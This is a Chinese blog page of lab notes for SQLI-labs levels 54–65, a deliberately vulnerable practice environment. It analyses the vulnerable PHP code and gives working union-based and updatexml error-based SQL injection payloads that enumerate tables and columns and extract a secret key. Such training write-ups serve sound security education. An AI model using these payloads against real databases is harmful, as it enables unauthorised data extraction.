<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='进阶挑战 54-65 关 Less-54 请求方式 注入类型 拼接方式 GET 联合、布尔盲注、延时盲注 id=&#39;$id&#39; 简单源码分析：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 if reset: # 根据时间戳生成 cookie setcookie(&amp;#39;challenge&amp;#39;, &amp;#39; &amp;#39;, time() - 3600000); else: if cookie 中有 challenge: $sessid=$_COOKIE[&amp;#39;challenge&amp;#39;]; else: # 生成 cookie $expire = time()&#43;60*60*24*30; $hash = data($table,$col); setcookie(&amp;#34;challenge&amp;#34;, $hash, $expire); if $_GET[&amp;#39;id&amp;#39;]: 计数器 &#43; 1 $sql=&amp;#34;SELECT * FROM security.'>
<title>SQLI labs 靶场笔记之进阶挑战 54-65 关</title>

<link rel='canonical' href='https://360rce.github.io/p/5b8yxplu/'>

<link rel="stylesheet" href="/scss/style.min.efe1e773d779dbe0d478a3345bc5ad949fed81363c53bfa8984135f20bf7841d.css"><meta property='og:title' content='SQLI labs 靶场笔记之进阶挑战 54-65 关'>
<meta property='og:description' content='进阶挑战 54-65 关 Less-54 请求方式 注入类型 拼接方式 GET 联合、布尔盲注、延时盲注 id=&#39;$id&#39; 简单源码分析：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 if reset: # 根据时间戳生成 cookie setcookie(&amp;#39;challenge&amp;#39;, &amp;#39; &amp;#39;, time() - 3600000); else: if cookie 中有 challenge: $sessid=$_COOKIE[&amp;#39;challenge&amp;#39;]; else: # 生成 cookie $expire = time()&#43;60*60*24*30; $hash = data($table,$col); setcookie(&amp;#34;challenge&amp;#34;, $hash, $expire); if $_GET[&amp;#39;id&amp;#39;]: 计数器 &#43; 1 $sql=&amp;#34;SELECT * FROM security.'>
<meta property='og:url' content='https://360rce.github.io/p/5b8yxplu/'>
<meta property='og:site_name' content='iceH&#39;s Blog'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='SQL注入' /><meta property='article:tag' content='sqlilab' /><meta property='article:published_time' content='2020-07-23T15:41:04&#43;00:00'/><meta property='article:modified_time' content='2020-07-23T15:41:04&#43;00:00'/><meta property='og:image' content='https://w.wallhaven.cc/full/x6/wallhaven-x696dv.jpg' />
<meta name="twitter:title" content="SQLI labs 靶场笔记之进阶挑战 54-65 关">
<meta name="twitter:description" content="进阶挑战 54-65 关 Less-54 请求方式 注入类型 拼接方式 GET 联合、布尔盲注、延时盲注 id=&#39;$id&#39; 简单源码分析：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 if reset: # 根据时间戳生成 cookie setcookie(&amp;#39;challenge&amp;#39;, &amp;#39; &amp;#39;, time() - 3600000); else: if cookie 中有 challenge: $sessid=$_COOKIE[&amp;#39;challenge&amp;#39;]; else: # 生成 cookie $expire = time()&#43;60*60*24*30; $hash = data($table,$col); setcookie(&amp;#34;challenge&amp;#34;, $hash, $expire); if $_GET[&amp;#39;id&amp;#39;]: 计数器 &#43; 1 $sql=&amp;#34;SELECT * FROM security."><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='https://w.wallhaven.cc/full/x6/wallhaven-x696dv.jpg' />
    <link rel="shortcut icon" href="/favicon.ico" />
<style>
    :root {
     
    --sys-font-family: "HarmonyOS_Sans_SC_Medium", Georgia, -apple-system, 'Nimbus Roman No9 L', 'PingFang SC', 'Hiragino Sans GB', 'Noto Serif SC', 'Microsoft Yahei', 'WenQuanYi Micro Hei', 'ST Heiti', sans-serif;
    --code-font-family: "JetBrainsMono Regular", Menlo, Monaco, Consolas, "Courier New";
    --article-font-family: "HarmonyOS_Sans_SC_Medium", var(--base-font-family);
  }
</style>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://npm.elemecdn.com/irithys-cdn@1.0.4/font/font.css";
        customFont.type = "text/css";
        customFont.rel = "stylesheet";
         document.head.appendChild(customFont);
}());
</script>
    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended">


        <div id="article-toolbar" style="position: sticky;top: 5px;z-index: 1000;">
            <a href="/" class="back-home">
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="15 6 9 12 15 18" />
</svg>



                <span>返回</span>
            </a>
        </div>
    

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
			<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" stroke="currentColor" fill="#BDBDBF"><path d="M512 256C512 397.4 397.4 512 256 512C114.6 512 0 397.4 0 256C0 114.6 114.6 0 256 0C397.4 0 512 114.6 512 256zM176 168V344C176 352.7 180.7 360.7 188.3 364.9C195.8 369.2 205.1 369 212.5 364.5L356.5 276.5C363.6 272.1 368 264.4 368 256C368 247.6 363.6 239.9 356.5 235.5L212.5 147.5C205.1 142.1 195.8 142.8 188.3 147.1C180.7 151.3 176 159.3 176 168V168z"></path></svg>
            
        </div>
        <h2 class="widget-title section-title">目录</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#less-54">Less-54</a></li>
    <li><a href="#less-55">Less-55</a></li>
    <li><a href="#less-56">Less-56</a></li>
    <li><a href="#less-57">Less-57</a></li>
    <li><a href="#less-58">Less-58</a></li>
    <li><a href="#less-59">Less-59</a></li>
    <li><a href="#less-60">Less-60</a></li>
    <li><a href="#less-61">Less-61</a></li>
    <li><a href="#less-62">Less-62</a></li>
    <li><a href="#less-63">Less-63</a></li>
    <li><a href="#less-64">Less-64</a></li>
    <li><a href="#less-65">Less-65</a></li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/5b8yxplu/">
                
                    <img src="https://w.wallhaven.cc/full/x6/wallhaven-x696dv.jpg" loading="lazy" alt="Featured image of post SQLI labs 靶场笔记之进阶挑战 54-65 关" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/%E5%90%B9%E6%A2%A6%E5%88%B0%E8%A5%BF%E5%B7%9E/" >
                吹梦到西州
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/5b8yxplu/">SQLI labs 靶场笔记之进阶挑战 54-65 关</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" stroke="currentColor" fill="#BDBDBF"><path d="M326.1 160l127.4-127.4C451.7 32.39 449.9 32 448 32h-86.06l-128 128H326.1zM166.1 160l128-128H201.9l-128 128H166.1zM497.7 56.19L393.9 160H512V96C512 80.87 506.5 67.15 497.7 56.19zM134.1 32H64C28.65 32 0 60.65 0 96v64h6.062L134.1 32zM0 416c0 35.35 28.65 64 64 64h384c35.35 0 64-28.65 64-64V192H0V416z"></path></svg>
                
                <time class="article-time--published">2020/07/23</time>
            </div>
        

        
            <div>
				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" stroke="currentColor" fill="#BDBDBF"><path d="M256 512C114.6 512 0 397.4 0 256S114.6 0 256 0S512 114.6 512 256s-114.6 256-256 256zM232 120V256c0 8 4 15.5 10.7 20l96 64c11 7.4 25.9 4.4 33.3-6.7s4.4-25.9-6.7-33.3L280 243.2V120c0-13.3-10.7-24-24-24s-24 10.7-24 24z"></path></svg>
                
                <time class="article-time--reading">
                    阅读时长: 2 分钟
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h1 id="进阶挑战-54-65-关">进阶挑战 54-65 关</h1>
<h2 id="less-54">Less-54</h2>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、布尔盲注、延时盲注</td>
<td><code>id='$id'</code></td>
</tr>
</tbody>
</table></div>
<p>简单源码分析：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Php" data-lang="Php"><span class="line"><span class="cl"><span class="k">if</span> <span class="nx">reset</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># 根据时间戳生成 cookie
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">setcookie</span><span class="p">(</span><span class="s1">&#39;challenge&#39;</span><span class="p">,</span> <span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="nx">time</span><span class="p">()</span> <span class="o">-</span> <span class="mi">3600000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nx">cookie</span> <span class="nx">中有</span> <span class="nx">challenge</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$sessid</span><span class="o">=</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;challenge&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># 生成 cookie 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$expire</span> <span class="o">=</span> <span class="nx">time</span><span class="p">()</span><span class="o">+</span><span class="mi">60</span><span class="o">*</span><span class="mi">60</span><span class="o">*</span><span class="mi">24</span><span class="o">*</span><span class="mi">30</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$hash</span> <span class="o">=</span> <span class="nx">data</span><span class="p">(</span><span class="nv">$table</span><span class="p">,</span><span class="nv">$col</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">setcookie</span><span class="p">(</span><span class="s2">&#34;challenge&#34;</span><span class="p">,</span> <span class="nv">$hash</span><span class="p">,</span> <span class="nv">$expire</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="nx">计数器</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT * FROM security.users WHERE id=&#39;</span><span class="si">$id</span><span class="s2">&#39; LIMIT 0,1&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nx">有查询成功</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="nx">输出查询信息</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="nx">：</span>
</span></span><span class="line"><span class="cl">        <span class="nx">啥都不输出</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># key 被双重过滤了
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$key</span> <span class="o">=</span> <span class="nx">addslashes</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;key&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$key</span> <span class="o">=</span> <span class="nx">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$key</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT 1 FROM </span><span class="si">$table</span><span class="s2"> WHERE </span><span class="si">$col1</span><span class="s2">= &#39;</span><span class="si">$key</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>代码中可以分享出，得让我们在 10 次注入测试中拿到 key 值。看了源码可以直接联合查询，10 次以内拿到 key 感觉问题不大，那么尝试看看吧：</p>
<p><strong>判断闭合方式</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;--+
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><strong>判断字段数</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; order by 3--+
</span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="mi">4</span><span class="c1">--+
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><strong>查询有可注入的字段</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39; union select 1,2,3 --+
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>字段数 2,3</p>
<p><strong>查询表名</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) --+
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>表名为：<code>bplubnri6m</code>，这个表名可能是随机的 不同用户不一样</p>
<p><strong>查询列名</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&#39;</span><span class="n">bplubnri6m</span><span class="s1">&#39;) --+
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>查到列名如下：id,sessid,secret_0UH9,tryy</p>
<p><strong>查询字段值</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39; union select 1,2,(select group_concat(secret_0UH9) from bplubnri6m) --+
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>拿到 key 值为：Vbf3WpKCBvu8s4rnCTEeWcPa</p>
<p>总共只需要 6 步，其中在判断字段数这里有不确定性，理论上 10 步以内是可以正常注入出来的。</p>
<h2 id="less-55">Less-55</h2>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、布尔盲注、延时盲注</td>
<td><code>id=($id)</code></td>
</tr>
</tbody>
</table></div>
<p>Less-55 给了 14 次尝试机会，代码基本上没有变化，只是闭合方式发生了变化，这里不再赘述。</p>
<h2 id="less-56">Less-56</h2>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、布尔盲注、延时盲注</td>
<td><code>id=('$id')</code></td>
</tr>
</tbody>
</table></div>
<p>和 Less-54 相比只是拼接方式不一样，还是那个姿势，详见 Less-54</p>
<h2 id="less-57">Less-57</h2>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、布尔盲注、延时盲注</td>
<td><code>id=&quot;$id&quot;</code></td>
</tr>
</tbody>
</table></div>
<p>和 Less-54 相比只是拼接方式不一样，还是那个姿势，详见 Less-54</p>
<h2 id="less-58">Less-58</h2>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>报错、布尔盲注、延时盲注</td>
<td><code>id='$id'</code></td>
</tr>
</tbody>
</table></div>
<p>Less-58 这里相比较于 Less-54 - Less-57 变化还是比较大的，主要有明显区别的代码如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Php" data-lang="Php"><span class="line"><span class="cl"><span class="nv">$unames</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="s2">&#34;Dumb&#34;</span><span class="p">,</span><span class="s2">&#34;Angelina&#34;</span><span class="p">,</span><span class="s2">&#34;Dummy&#34;</span><span class="p">,</span><span class="s2">&#34;secure&#34;</span><span class="p">,</span><span class="s2">&#34;stupid&#34;</span><span class="p">,</span><span class="s2">&#34;superman&#34;</span><span class="p">,</span><span class="s2">&#34;batman&#34;</span><span class="p">,</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span><span class="s2">&#34;admin1&#34;</span><span class="p">,</span><span class="s2">&#34;admin2&#34;</span><span class="p">,</span><span class="s2">&#34;admin3&#34;</span><span class="p">,</span><span class="s2">&#34;dhakkan&#34;</span><span class="p">,</span><span class="s2">&#34;admin4&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$pass</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$unames</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s1">&#39;Your Login name : &#39;</span><span class="o">.</span> <span class="nv">$unames</span><span class="p">[</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]];</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s1">&#39;Your Password : &#39;</span> <span class="o">.</span><span class="nv">$pass</span><span class="p">[</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]];</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>因为这里输出只输出 <code>$unames</code> 和 <code>$pass</code> 数组，pass 数组就是 unames 数组的逆序，所以这里使用联合查询的话是没有效果的，输出不了有用的信息。天无绝人之路，但是下面输出：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">print_r</span><span class="p">(</span><span class="nx">mysql_error</span><span class="p">());</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>所以这里就可以进行报错注入，下面直接丢 payload 吧：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+ 
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="k">column_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">table_name</span><span class="o">=</span><span class="s1">&#39;k4xoowbia1&#39;</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="c1">--+ 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and updatexml(1,concat(0x7e,(select group_concat(secret_D5OR) from k4xoowbia1),0x7e),1)--+ 
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>这里我注入的表名为：<code>k4xoowbia1</code>，列名为：<code>secret_D5OR</code></p>
<h2 id="less-59">Less-59</h2>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>报错、布尔盲注、延时盲注</td>
<td><code>id=$id</code></td>
</tr>
</tbody>
</table></div>
<p>与 Less-58 的思路一样，只是拼接方式不一样，详见 Less-58</p>
<h2 id="less-60">Less-60</h2>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>报错、布尔盲注、延时盲注</td>
<td><code>id=（&quot;$id&quot;）</code></td>
</tr>
</tbody>
</table></div>
<p>与 Less-58 注入方式一致，只是拼接方式不一样罢了，详见 Less-58</p>
<h2 id="less-61">Less-61</h2>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>报错、布尔盲注、延时盲注</td>
<td><code>id=(('$id'))</code></td>
</tr>
</tbody>
</table></div>
<p>与 Less-58 注入方式一致，只是拼接方式不一样罢了，详见 Less-58</p>
<h2 id="less-62">Less-62</h2>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>布尔盲注、延时盲注</td>
<td><code>id=('$id')</code></td>
</tr>
</tbody>
</table></div>
<p>此时报错也取消了，这里只能进行布尔盲注或者延时盲注了，对于盲注强烈建议使用脚本，人工太慢，在实战工程中还是靠 sqlmap 这种自动化注入神器或者自己写脚本了，手工注入的话岂不是得天荒地老。</p>
<h2 id="less-63">Less-63</h2>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>布尔盲注、延时盲注</td>
<td><code>id='$id'</code></td>
</tr>
</tbody>
</table></div>
<p>与 Less-62 注入方式一致，只是拼接方式不一样罢了，详见 Less-62</p>
<h2 id="less-64">Less-64</h2>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>布尔盲注、延时盲注</td>
<td><code>id=(($id))</code></td>
</tr>
</tbody>
</table></div>
<p>与 Less-62 注入方式一致，只是拼接方式不一样罢了，详见 Less-62</p>
<h2 id="less-65">Less-65</h2>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>布尔盲注、延时盲注</td>
<td><code>id=(&quot;$id&quot;)</code></td>
</tr>
</tbody>
</table></div>
<p>与 Less-62 注入方式一致，只是拼接方式不一样罢了，详见 Less-62</p>
<h1 id="参考资料">参考资料</h1>
<ul>
<li><a class="link" href="https://www.sqlsec.com/2020/05/sqlilabs.html"  target="_blank" rel="noopener"
    >国光的SQLI labs 靶场精简学习记录</a></li>
</ul>

</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/sql%E6%B3%A8%E5%85%A5/">SQL注入</a>
        
            <a href="/tags/sqlilab/">sqlilab</a>
        
    </section>


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">相关文章</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="has-image">
    <a href="/p/cjxjnagt/">
        
        
            <div class="article-image">
                
                    <img src="https://w.wallhaven.cc/full/x6/wallhaven-x691gz.jpg" loading="lazy" data-key="cjxjnagt" data-hash="https://w.wallhaven.cc/full/x6/wallhaven-x691gz.jpg"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">SQLI labs 靶场笔记之堆叠注入 38-53 关</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/ojwgoapt/">
        
        
            <div class="article-image">
                
                    <img src="https://w.wallhaven.cc/full/1p/wallhaven-1p28eg.jpg" loading="lazy" data-key="ojwgoapt" data-hash="https://w.wallhaven.cc/full/1p/wallhaven-1p28eg.jpg"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">SQLI labs 靶场笔记之高级注入姿势 21-37 关</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/gkoe77ij/">
        
        
            <div class="article-image">
                
                    <img src="https://w.wallhaven.cc/full/we/wallhaven-wed2qq.png" loading="lazy" data-key="gkoe77ij" data-hash="https://w.wallhaven.cc/full/we/wallhaven-wed2qq.png"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">SQLI labs 靶场笔记之基础挑战 1-20 关</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/yyvork8r/">
        
        
            <div class="article-image">
                
                    <img src="https://w.wallhaven.cc/full/2y/wallhaven-2yop8y.png" loading="lazy" data-key="yyvork8r" data-hash="https://w.wallhaven.cc/full/2y/wallhaven-2yop8y.png"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">SQL注入学习之MYSQL报错注入</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/wto41ytz/">
        
        
            <div class="article-image">
                
                    <img src="https://w.wallhaven.cc/full/yx/wallhaven-yx9xvg.jpg" loading="lazy" data-key="wto41ytz" data-hash="https://w.wallhaven.cc/full/yx/wallhaven-yx9xvg.jpg"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">SQL注入学习之MYSQL盲注</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <script src="https://utteranc.es/client.js" 
        repo="360rce/blog-comment"
        issue-term="pathname"
        
        label="utterances"
        
        crossorigin="anonymous"
        async
        >
</script>

<style>
    .utterances {
        max-width: unset;
    }
</style>

<script>
    let utterancesLoaded = false;

    function setUtterancesTheme(theme) {
